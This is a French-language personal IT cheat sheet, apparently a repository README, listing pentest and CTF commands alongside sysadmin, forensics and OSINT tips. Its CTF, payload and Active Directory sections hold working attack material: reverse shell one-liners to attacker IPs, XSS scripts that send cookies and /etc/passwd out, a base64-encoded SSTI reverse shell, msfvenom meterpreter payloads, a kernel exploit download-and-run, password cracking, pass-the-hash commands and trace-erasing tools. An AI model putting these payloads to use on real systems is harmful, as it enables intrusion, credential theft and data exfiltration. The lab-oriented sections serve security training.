# Useful

> Le but de ce document est de regrouper les différents informations à propos de l'IT dans un seul repository accessible de partout

---

## CTF
	
- https://www.revshells.com/
- Par internet --> https://dashboard.ngrok.com/get-started/setup
- Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
	- `<?php system($_GET["cmd"]) ?>`
   	- `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");`
        - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
        - [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
	- Spawn un meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1234 >/tmp/f`

 - Reverse shell via SQL :
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
```

- Reverse shell powerhell --> `powershell -r 10.10.9.11:1234`

- Récuperer un fichier à travers un reverse shell LINUX --> `cat nocturnal_database.db > /dev/tcp/10.xx.xx.xx/8888` ; de l'autre côté --> `nc -lnvp 8888 > nocturnal.db`
- Récuperer un fichier à travers un reverse shell WINDOWS --> `Get-Content '08949382-134f-4c63-b93c-ce52efc0aa88' | .\nc.exe 10.10.16.15 1236`; de l'autre côté --> `nc -lnvp 1236 > 08949382-134f-4c63-b93c-ce52efc0aa88`

- [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)

- `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges

- SSH proxy --> `ssh -D 1212 root@proxy.fr (socks5  127.0.0.1 1212)`
- SSH Port Forwarding --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
- Chisel port forwarding --> `chisel server -p 8888 --reverse` puis `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`, plusieurs ports `./chisel_1.10.0_linux_amd64 client 10.10.16.25:8888 R:40056:127.0.0.1:40056 R:5000:127.0.0.1:5000 R:7096:127.0.0.1:7096`

- WU CTF Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024

### Tools

- [Sploitus](https://sploitus.com/) --> Un google pour les exploits et vulnérabilitées 

- [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)

- [Moonwalk](https://github.com/mufeedvh/moonwalk) --> Efface les traces après des actions sur un système

- Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence + https://johnermac.github.io/


### Payload

- All payloads for reverse shell --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

- `' or 1=1- -` --> Bypass authentification web
	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)

- SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
  	- Outil automatique SQLMap --> https://github.com/DedSecCyber/DedSecSQL
	- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
		- `sqlmap -r r.txt --batch --dbs`
		- `sqlmap -r r.txt --batch -D Staff --tables`
		- `sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump`

	- `sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3`


- [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
	- `<iframe src="javascript:alert('xss')">`
 	- `<script>alert(‘XSS’)</script>`

    	- Cookie -->
    			- `</script><img src=1 onerror=alert(document.cookie)>` ou `<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>` ou `<a href="javascript:fetch('http://10.10.14.17:1111/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>` ou Javascript :
    
	```javascript=
	    <script>
	    fetch('http://<<your-ip>>:9001/', {
	              method: 'POST',
	              mode: 'no-cors',
	              body:document.cookie
	        });
		</script>
	 ```

    - Pour récupérer un fichier :
     ```javascript=
    <script>
	fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
	  .then(response => response.text())
	  .then(data => {
	    fetch("http://10.10.14.66:9001/?file_content=" + encodeURIComponent(data));
	  });
    </script>
    ```
     ou
  ```javascript=
    <script>
    var url = "messages.php?file=../../../../../../../etc/passwd"
    var attacker = "http://10.10.14.66:9001/exfil"
    var xhr = new XMLHttpRequest()
    xhr.onreadystatechange = function () {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
      }
    }
    xhr.open("GET", url, true)
    xhr.send(null)
  </script>
  ```
 
- Jinga :
  	- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` --> payload id
  	- `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvNDQ0NCAwPiYx | base64 -d | bash")}}{%endif%}{% endfor %}` --> RCE avec base64
 
---
 
## BruteForce
### Hydra

- Password WEB --> `hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V`

- Password SSH --> `hydra -l molly -P rockyou.txt 10.10.212.76 ssh`
	- Port spécifique --> `hydra -s 1234 -l paul -P rockyou.txt 192.168.1.1 ssh`

- Password FTP --> `hydra -l chris -P /usr/share/wordlist/rockyou.txt 10.10.150.97 ftp`

### Crack hash

- Crack ZIP --> `zip2john X.zip > zip.hashes \n
john zip.hashes` ou `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_files.zip`

- Crack clé RSA SSH --> `ssh2john.py secretKey > id_rsa.hash \n john --wordlist=dict.txt id_rsa.hash`

- Identifier un hash avec hashcat --> `hash-identifier "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03"` ou `hashcat --identify hash `
- Liste hash pour hashcat --> https://hashcat.net/wiki/doku.php?id=example_hashes
	- Crack d'une clé SHA256 avec `hashcat` --> `hashcat -m 1420 hash --wordlist /usr/share/wordlists/rockyou.txt` (format pass:salt)
 		- Avec incrémentation --> `hashcat -m 1400 -D 1,2 -a 3 -i --increment-min 1 --increment-max 10 -1 ?l?u?d b0c83cbeff5e6e61cfc00eb4c1802289c9514d5328d718484a4eb195266e14a4 ?1?1?1?1?1?1?1?1?1`
	- Crack MD5 hashcat --> `hashcat -m 0 -a 0 md5.txt rockyou.txt`
	- [SHA512](https://samsclass.info/123/proj10/p12-hashcat.htm) --> `hashcat -m 1800 -a 0 -o result --remove hash /usr/share/wordlists/rockyou.txt`
 	- Apache --> `hashcat -m 1600 hash -a 0 /usr/share/wordlists/rockyou.txt`
 	- Hash Linux BCRYPT --> `hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt`
 	- Crack hash Windows NTLMV2 --> `hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt`
    - Crack hash Windows Kerberos --> `hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt`

---
	
## Scan
### Passif 

- Ping :
  * TTL 63 --> Linux 
  * TTL 127 --> Windows

- Nslookup/dig
- Enumération DNS --> `theHarvester -d mokoil.com -e 8.8.8.8 -c -n` ou `wfuzz -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -w Downloads/subdomains-top1million-5000.txt --hh 0`
- Enumération DNS avec NMAP --> `nmap --script dns-brute rettbl.fr`
  
- Table ARP

### Actif 

- Depuis une machine Windows : 
	- Voir les machines actives --> `for i in {1..254} ;do (ping 172.16.1.$i -c 1 -w 5  >/dev/null && echo "172.16.1.$i" &) ;done` ou ` 1..254 | % {"172.16.2.$($_): $(Test-Connection -count 1 -comp 172.16.2.$($_) -quiet)"}`
   	- Voir les ports ouverts sur une machine Windows --> `1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.1",$_)) “Port $_ is open!”} 2>$null`
   	- Voir les ports ouverts en local --> `Get-NetTCPConnection`
   		- Sur un port spécifique --> `Get-NetTCPConnection -State Listen -LocalPort 389`
    - Voir les ports ouverts sur une machine Linux depuis une machine Windows --> `for p in {1..65535}; do (echo >/dev/tcp/localhost/$p) >/dev/null 2>&1 && echo "$p open"; done`

- Depuis une machine Linux --> `for i in $(seq 1 254); do ping -c 1 192.168.1.$i | grep "bytes from" & done`

- Voir les ports ouverts --> `nmap -Pn 192.168.1.1`
- Voir la version des services --> `nmap -sV -sC 192.168.1.1`
- Voir tout les ports --> `sudo nmap -sS -p- 192.168.1.1`
- Pour le web --> `nikto -h http://172.16.28.230/` ou `whatweb http://linkvortex.htb` (version des plugins)
	- Port knocking : `for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 172.16.28.247; done` ou `knock 192.168.33.5 -v 7469 8475 9842`

- Scan UDP --> `nmap -sU underpass.htb`

- Depuis une machine Linux :
  	- Voir les machines actives --> `nc -zv 172.17.0.2 1-10000 2>&1 | grep -v "Connection refused"`

- Wordpress --> `wpscan --url www.mokoil.com`
	- En mode agressif --> `wpscan --url www.mokoil.com -e vp,vt,u`
	- Faire un brute-force sur les mots de passe --> `wpscan --url http://<target-IP>/ --passwords wordlist.txt --usernames victor`
	- Brute force sur les plugins --> `wpscan --url http://10.10.110.119 --plugins-detection mixed -t 30 -e vp,vt,u`

- [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [PSpy](https://github.com/DominicBreuker/pspy)

- WAF --> `wafw00f http://rainbowstore2.chall.malicecyber.com/ `

#### Directory

- Gobuster --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt`
  	- Avec extensions --> `gobuster dir -u http://10.10.96.122 -w /usr/share/wordlists/dirb/common.txt -x .php`
  	- Sous-domaines --> `gobuster vhost -u http://10.129.43.197/ -w /usr/share/wordlists/subdomains-top1million-5000.txt --append-domain -t 40 -k -r`
- Dirb --> `dirb http://mypage.com`
	- Chercher des extensions --> `dirb http://172.16.28.230/ -X .txt .php`
- Ffuf --> `ffuf -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -ac -v -u http://172.16.28.230/FUZZ -recursion -r`
  	- Sous-domaines --> `ffuf -w /usr/share/wordlists/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 ` ou `ffuf -c -u http://linkvortex.htb -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.linkvortex.htb" -fc 301`
 
- Fuzzer un ID --> `ffuf -u http://file.era.htb/download.php?id=FUZZ -w ids.txt -H "Cookie: PHPSESSID=gegq3muhrjulq8fvmhkd7ckvds" -mr "Your Download Is Ready"`

- Analyse repo [GIT-DUMPER](https://github.com/arthaud/git-dumper) --> `gitdumper.sh http://shop.trickster.htb/.git/ dest-dir .`

---

## Linux - Commande

- Monter USB --> `mount /dev/usbNAME /media/usb`
  - Trouver sa clé USB --> `sudo blkid` ou `df -h`
  
- Monter serveur python --> `python3 -m http.server 555 --bind 192.168.1.1`
- Transfert de fichier des 2 côtés --> [raven](https://github.com/gh0x0st/raven)

- `kali-undercover` --> transforme le GUI en Windows

- `last` --> dernière connexion
- `lastb` --> dernière connexion qui à échoué

- `find / -name XXX 2>/dev/null` --> trouver un fichier dans le système
- `grep -inr ".env" /home/user` --> trouver un mot à l'intérieur des fichiers

- Trouver des mots de passe dans un répertoire --> `grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .`

- `lastlog` --> Voir les différents comptes et leurs dernières connexions

- Pour **compresser avec tar** --> `tar -czvf logs_archive.tar.gz ./*`
    - il est possible de supprimer les fichiers après compressions --> `tar -czvf logs_archive.tar.gz ./* --remove-files`
- Pour **décompresser avec tar** --> `tar -xzvf logs_archive.tar.gz`

- Pour **décompresser avec gz** --> `gunzip -d ficher.gz`
		
- `scp Alcasar-v3.2.ova root@192.168.100.40:/root/Alcasar-v3.2.ova` --> envoyer un fichier via ssh
- `scp -r root@192.168.100.1:/root/ /home/mathis` --> récupérer un fichier via ssh
	 
- Mettre une adresse IP statique sur Ubuntu --> `/etc/netplan/01-netcfg.yaml` (attention fichier `.yaml` donc sensible aux indentations/espaces) :

```bash=	
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
     dhcp4: no
     addresses: [192.168.1.233/24]
     gateway4: 192.168.1.1
     nameservers:
       addresses: [8.8.8.8]
```
       
- Mettre une adresse IP statique Debian --> `/etc/network/interfaces` :

```bash=
iface eth0 inet static
allow-hotplug eth0
     address 192.168.1.2/24
     gateway 192.168.1.1
```

- Voir les IP/port liées aux processus --> `sudo lsof -i -n -P`
       
- Shutdown now --> `sudo shutdown -h now`

- Clear history --> `history -c`

- Récupérer les fichiers d'unn dossiers sur Internet : `wget -r -np -nH --cut-dirs=2 https://archive.apache.org/dist/tomcat/tomcat-6/`

- Persistence Linux --> https://hadess.io/the-art-of-linux-persistence/


### Bash - Linux

- Récupérer le X caratères d'une string --> `cut -c 8-19`

- Récupérer les X derniers caratères d'une string --> `tail  -c 6`

- Récupérer des fichiers en FTP passif : `wget -m --no-passive ftp://anonymous:anonymous@10.10.110.100`

---

## Windows - Commande

- Trouver le mot de passe wifi --> `netsh wlan show profiles "Bbox-R&T" key=clear`

- `dir C:\*.ova /S | more` --> Recherche dans le système un fichier .ova

- `netstat -anpe` --> Tout les flux actifs actutellement

- `powercfg /batteryreport` --> Sort un rapport sur l'état de la batterie (à faire en powershell)

- `ipconfig /displaydns | find X` --> voir les recherches DNS

- Exécuter des scripts powershells --> `Set-ExecutionPolicy Unrestricted`

- Trouver les fichiers volumineux (en cmd) --> `forfiles /S /M * /C "cmd /C if @fsize GEQ 1073741824 echo @path`
  	- En powershell --> `Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 500MB} | Sort-Object length -Descending | Select-Object Name,Directory,@{n='GB';e={"{0:N2}" -F ($_.length/ 1GB)}}`
 
- Télécharger des fichiers via powershell :
	- `$url = "http://10.10.16.39:8000/python3.zip";$dest = "C:\temp\python.zip";Invoke-RestMethod -Uri $url -OutFile $dest`
	-  `certutil -urlcache -split -f http://10.10.16.28/winpeas.exe winpeas.exe`

- Trouver un binaire précis en powershell --> `Get-ChildItem -Path C:\ -Filter mysql.exe -Recurse -ErrorAction SilentlyContinue`

- MySQL powershell --> `.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`

- Lister la corbeille Windows --> `$shell = New-Object -ComObject Shell.Application;$recycleBin = $shell.Namespace(0xA);$recycleBin.items() | Select-Object Name, Path`
- Lister la corbeille AD dans l'environnement de l'utilisateur --> `Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *`

- Dézipper via powershell --> `Expand-Archive -Path python3.zip -DestinationPath .`

---

## Malware
### Linux

- [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier
- [Exalyze](https://exalyze.io/) --> étude fichier malware 

- https://github.com/CYB3RMX/Qu1cksc0pe --> Etude fichier local

- [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)
	- Lister les SUIDS --> `find / -perm /4000 2>/dev/null`
   	- Exploitation automatique --> https://github.com/Frissi0n/GTFONow
 
- Metasploit :
  	- Créer une librairie --> `msfconsole -p linux/x64/exec CMD=/bin/bash -f elf-so > shell.so`
  	- Créer un ELF --> `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.11 PORT=9001 -f elf -o viens.elf`
  	- Créer une DLL --> `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll`
  	- Créer un exe --> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f exe -o meterpreter_payload.exe`
  	- Scanner une machine/réseau --> `use auxiliary/scanner/portscan/tcp`
  	- Port Forwarding --> `portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5`
  	- Excuter une commande sur plusieurs sessisions --> `sessions -c 'pwd' 42-45`

 - Boite à outils RedTeam --> https://arttoolkit.github.io/

- [USB Payload](https://github-wiki-see.page/m/hak5darren/USB-Rubber-Ducky/wiki/Payloads) (liste payloads pour attaque via USB)

- Kernel exploit --> `wget https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c && gcc CVE-2017–16995.c -o CVE-2017–16995 && ./CVE-2017-16995`

### Windows 

- `ECHO@OFF start` (mettre le fichier en .bat) --> lance des choses à la suite

- `%0|%0` (mettre le fichier en .bat) --> Ralentis l'ordinateur

### Active Directory - AD

- Samba (connexion FTP like) --> `smbclient -L \\10.129.118.175`
  	- Connexion à un répertoire --> `smbclient -N \\\\10.129.197.116\\backups`
  	- Lister les répertoires avec des identifiants --> `crackmapexec smb 10.10.110.3 -u 'mrb3n' -p 'W3lc0me123!!!' --shares`
  	- Accèder à un répertoires avec des identifiants --> `smbclient -U 'mrb3n%W3lc0me123!!!' //10.10.110.3/Backups`
  	- Récupérer tout les fichiers d'un partage --> `recurse ON;mget *`
  	- Déposer des fichiers en SMB --> `smb> put rettbl.txt` ou `smbclient -U 'j.fleischman%J0elTHEM4n1990!' //fluffy.htb/IT -c "put exploit.zip"`
 
- Récupérer les comptes du domaines [kerbrute](https://github.com/ropnop/kerbrute) --> `./kerbrute_linux_amd64 userenum --dc frizzdc.frizz.htb -d frizz.htb /usr/share/wordlists/usernames.txt `

- CrackMapExec (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
  	- Obtenir les utilisateurs de l'AD --> `crackmapexec smb 10.129.186.60 --pass-pol -u 'guest' -p '' --rid-brute`
  	- Password spraying (test des mots de passe sur plusieurs machines) --> `crackmapexec smb 10.10.110.0/24 -u 'mrb3n' -p 'W3lc0me123!!!'` ou `crackmapexec winrm 127.0.0.1 -u jbercov -p dante_password`
 
- Ldapdomaindump (depuis un utilisateur extraire toutes les informations) --> `ldapdomaindump ldap://cicada.htb -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`

- Utilisation de BloodHound --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt OU directement `python bloodhound.py -u ryan -p WqSZAF6CysDQbGb3 -d sequel.htb -ns 10.10.11.51 -c All`
  	1. On récupère le collecteur --> `wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe`
  	2. On récupère BloodHound --> `wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-arm64.zip`
  	3. On lance le collecteur --> `.\sharphound.exe `
  	4. On récupère le zip --> `download 20230907051940_BloodHound.zip`
  	5. On lance `neo4j console` et `bloodhound` (si 1ère connexion changer mot de passe via interface web `localhost:7687`)
  	6. On importe le zip dans l'interface graphique 

- Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
  	- Activer le `xp_cmdshell` --> `enable_xp_cmdshell` ou ⬇️ 
```mssql=
SQL (sophie  dbo@master)> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sophie  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
```

- GTFoBins pour Windows --> https://lolbas-project.github.io/
- GTFO pour DLL --> https://hijacklibs.net/

- Si problème d'horloge --> `faketime "$(ntpdate -q 10.10.11.42|awk '{print $1 " " $2}')" [Your Command here]`

- RPC --> `rpcclient -U '%' 10.10.10.161`

- Obtenir les hash utilisateur --> `impacket-GetNPUsers htb.local/ -dc-ip 10.129.118.175 -request` ou `python GetNPUsers.py dante/jbercov -no-pass -dc-ip 127.0.0.1`

- Depuis un dump de fichier obtenir les hash --> `impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit`

- Connexion sur la machine cliente --> `evil-winrm -i 10.129.118.175 -u svc-alfresco -p s3rvice`
  	- Avec hash --> `evil-winrm -u 'Administrator' -H 'f223277b637be474af366a652b9abb06' -i 10.10.110.3`

- Avoir les informations sur l'utillisateur Windows --> `net user` ou `whoami /priv`

- Mimikatz --> `mimikatz # lsadump::sam`

- Print nightmare --> `impacket-rpcdump @10.10.110.20 | grep MS-RPRN` + `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll` + `python CVE-2021-1675.py "test:t3st123@10.10.110.20" '\\10.10.16.9\MyShare\rev.dll'`

- Ressources pentest AD --> https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
  	- [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/)
  	- https://github.com/mranv/adPentest

- Minmap AD pentest : https://github.com/Imp0sters/ADMR

---

## Forensics

- OsForensics --> Fouiller un PC
- BleachBit --> Supprime les fichiers de façon définitive
- TestDisk, Recuva, PhotoRec --> Recover Data
- MVT --> analyse de téléphone
- Medicat --> Fait sauter les mots de passe
- Kon Boot --> Supprime le mot de passe à la volée
- [APKLeaks](https://github.com/dwisiswant0/apkleaks) --> Projet qui scanne une application Android
- [MagicNumbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)
- Dump de Ram VirtualBox --> https://www.ired.team/miscellaneous-reversing-forensics/dump-virtual-box-memory
	- `VBoxManage.exe debugvm "memento" dumpvmcore --filename C:\Users\mletot\Desktop\dump.raw`
 - Problème Virtualbox Kali --> https://forum.ubuntu-fr.org/viewtopic.php?id=2053356

 - Réseau :
   	- [NetworkMinor](https://www.netresec.com/?page=NetworkMiner)
   	- https://github.com/Srinivas11789/PcapXray

- Volatility --> https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet ou https://blog.onfvp.com/post/volatility-cheatsheet/
  	- 1ère étape (Identification DUMP) --> `volatility imageinfo -f dump.ram` ou `vol.py -f “/path/to/file” windows.info`
  	- 2ème étape (Listing des process et commandes) --> `vol.py -f “/path/to/file” windows.pstree` ou `vol.py -f “/path/to/file” windows.cmdline`
  	- 3ème étape (Listing des fichiers) --> `python3 vol.py -f ../../task.raw windows.filescan > files`
  	- 4ème étape (dump de fichiers) --> `python3 vol.py -f ../../task.raw -o ./result/ windows.dumpfiles --pid 2880`
 - Analyse Volatility web --> https://github.com/k1nd0ne/VolWeb?tab=readme-ov-file

---

## OSINT

- [OsintRocks](https://osint.rocks/) --> regroupement d'outils OSINT - USERNAME, MAIL, PHONE, DOMAIN/IP
- [Script G-Hunt](https://github.com/mxrch/GHunt) --> Rassemble les informations à partir d'une adresse mail google
- [NexFil](https://github.com/thewhiteh4t/nexfil) --> Trouve les réseaux sociaux d'une personne
- [29a](https://29a.ch/photo-forensics) --> Analyse de photo forensics
- Exif Pilot --> Ajout de donnéees exif à une photo
- Google dorks --> https://usersearch.org/updates/2023/02/05/the-ultimate-google-dorking-cheatcheat-2023/?amp=1
- Trouver des identifiants --> https://bugmenot.com/
- Recherche sur Mail & Téléphone --> https://epieos.com/
- https://intelx.io/ --> Recherche de leak
- https://facecheck.id/ --> Recherche par visage
- Framework --> https://osintframework.com/
- Analyser un mail --> https://mailheader.org/

- [EPIOS](https://epieos.com/)
- [Shodan](https://www.shodan.io/)
- [Onyphe](https://www.onyphe.io/)
- [GreyNoise](https://viz.greynoise.io/)
- https://dorkgpt.com/

---

## Photo

- Real Esrgan --> améliore la qualité des photos
- [ImgUpscaler](https://www.imgupscaler.com/) --> Site qui améliore la qualité
- [Resizer.in](https://imageresizer.com/) --> Augmente/Diminue une image en gardant la qualité
- [Hama](https://www.hama.app/) --> Efface une personne ou un objet sur une image
- [Pixel]([https://github.com/ORB-HD/deface](https://www.facepixelizer.com/fr/)) --> Flouter des visages
- [Polarr](https://photoeditor.polarr.com/) --> Outil de retouche en ligne
- Vérifier qu'il n'y a pas de ZIP dans une photo --> `binwalk -e cutie.png`
- [ExifCleaner](https://exifcleaner.com/) --> Enlève les données exif
- Travailler sur une photo stégano
	- https://stegonline.georgeom.net/
	- [aperisolve](https://www.aperisolve.com/)

- Enlever les watermarks --> https://www.watermarkremover.io/fr/upload
- Enlever le background --> https://www.remove.bg/

---

## Dessin

- [Tldraw](https://www.tldraw.com/) --> faire des shcémas


## Backup

- Auto Archiver
- [MeeroDrop](https://www.meerodrop.com/) --> Transfert de fichier jusqu'à 20 Go
- Blomp --> Cloud jusqu'a 200 Go
- [ufile](https://ufile.io/) --> Dépôt de fichier 5 Go

---

## Other

- Barrier --> permet d'avoir plusieurs PC sur 1 PC
- Locust --> Test de montée en charge
- DroidCam --> Transforme le téléphone en Webcam
- Automata --> Automatise des tâches Web
- Upload files --> [File IO](https://www.file.io/)
- partage de fichier via Tor --> [OnionShare](https://github.com/onionshare/onionshare)
- Find movie --> `"Titre du film" -inurl(html|htm|php|txt) intitle: index.of "last modified" (mp4|avi)`

---

## Admin Sys
### Linux

- Lister les fichiers volumineux d'un répertoire --> `du -ah MSI/ | sort -rh | head -n 10`

- [Crontab](https://crontab.guru/)

- Obtenir l'adresse IP quand pas `ping` --> `hostname -I`

- VboxAdditions (mettre la VM en full écran) --> `sudo sh ./VBoxLinuxAdditions.run --nox11`

- Surveiller des fichiers 
	- `watch -n 10 tail /var/log/access.log`
	- `tail -f /var/log/access.log`
	- Plusieurs fichiers --> `tail -f /var/log/auth.log /var/log/fail2ban.log`

- REGEX pour trouver des IPs --> `grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt`

- [Code Retour bash](https://debian-facile.org/doc:programmation:shells:script-bash-etat-de-sorie-et-les-tests)

- Trouver une machine quand on a pas son IP --> `netdiscover -r 10.0.2.0/24`

- Modification date Linux --> `date +%T -s "10:13:13"`
	- `timedatectl set-timezone "Europe/Paris"`

- Tester la communication sur un port --> `echo "Papa" > /dev/tcp/127.0.0.1/80`

- Stopper tout les docker en même temps --> `sudo docker stop $(sudo docker ps -aq)`

- Trouver les derniers fichiers écrits sur le système : `sudo find / \( -path /proc -o -path /sys \) -prune -o -type f -printf "%T@ %p\n" | sort -n | tail -n 50`
- Voir les fichiers créer entre 2 dates avec exclusion de répertoires : `sudo find / -type f \( -newermt "2023-06-01" ! -newermt "2023-07-01" -o -newermt "2023-07-01" ! -newermt "2023-08-01" \) ! -path "/home/kali/.`

- Créer un fichier avec des nombres entre 2 valeurs --> `seq 0 6600 > ids.txt`

### Windows

- Diagnostic PC --> https://userdiag.com/
- Dévrerouiler BIOS --> https://bios-pw.org/
- Test PC (tronScript) --> [Tron](https://www.reddit.com/r/TronScript/wiki/downloads/)

### Other

- [Server World](https://www.server-world.info/en/)
- [Liste de documentation](https://docs.liam-le-may.fr/)
  
- Code screenshot pour présentation --> https://carbon.now.sh/
- Exposer un site web gratuitement --> https://korben.info/echoduck-hebergement-sites-web-statiques-securise.html
- Faire des schémas d'arborsence en ligne --> https://tree.nathanfriend.io/
- Vérification fichier yaml --> https://onlineyamltools.com/validate-yaml
- Générer des tableaux LATEX --> https://www.tablesgenerator.com/ ou https://tableconvert.com/latex-generator
- Schéma MD --> https://support.typora.io/Draw-Diagrams-With-Markdown/
- [Calcul CVSS](https://cvss.js.org/)
- Browerling --> Permet de sandboxer un lien 
- OnWorks --> Sandbox de distribution Linux au sein du naviguateur
- [Sandbox](https://sandboxie-plus.com/) --> Sandbox standalone
  
---

## Hardening

- Connexion clé ssh (`PAM authentification` & `password authentification no`)

- Si on a une DMZ mettre en place un bastion (serveur qui sécurise tout ce qui a derrière)

- Désactiver root et avoir un autre compte avec sudo (`permit root login no`)

- Désactiver open ssl server si pas nécessaire

- Mettre en place fail2ban

- Avoir le firewall iptables :


	- `iptables -A INPUT -i eth0 -p tcp --dport 22 -m state NEW,ESTABLISHED -j ACCEPT`
	  --> Ce qui rentre sur le serveur (INPUT) via l'interface ETH0 avec le protocole TCP et le port de DESTINATION 22 on l'accepte

	- `iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state ESTABLISHED -j ACCEPT`
